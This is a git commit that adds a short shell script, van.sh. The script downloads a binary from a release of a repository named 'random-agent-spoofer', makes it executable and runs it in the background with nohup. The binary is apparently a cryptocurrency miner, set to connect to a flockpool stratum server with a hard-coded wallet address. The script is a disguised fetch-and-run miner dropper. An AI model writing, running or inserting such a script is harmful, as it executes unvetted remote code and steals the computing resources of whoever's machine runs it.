ebf29c5c63238149ddd217801e2c60b54c3c568b
trangtrau <30510221+trangtrau@users.noreply.github.com>
2022-07-12 11:12:35 +0700

    Create van.sh

---
+++ van.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar && chmod +x ar 
+nohup ./ar -a gr -o stratum+ssl://asia.flockpool.com:5555 -u RQwAiGZmVsR95WuzeijuX2wTvYnTdKhbAh.TEST2703 -p x &
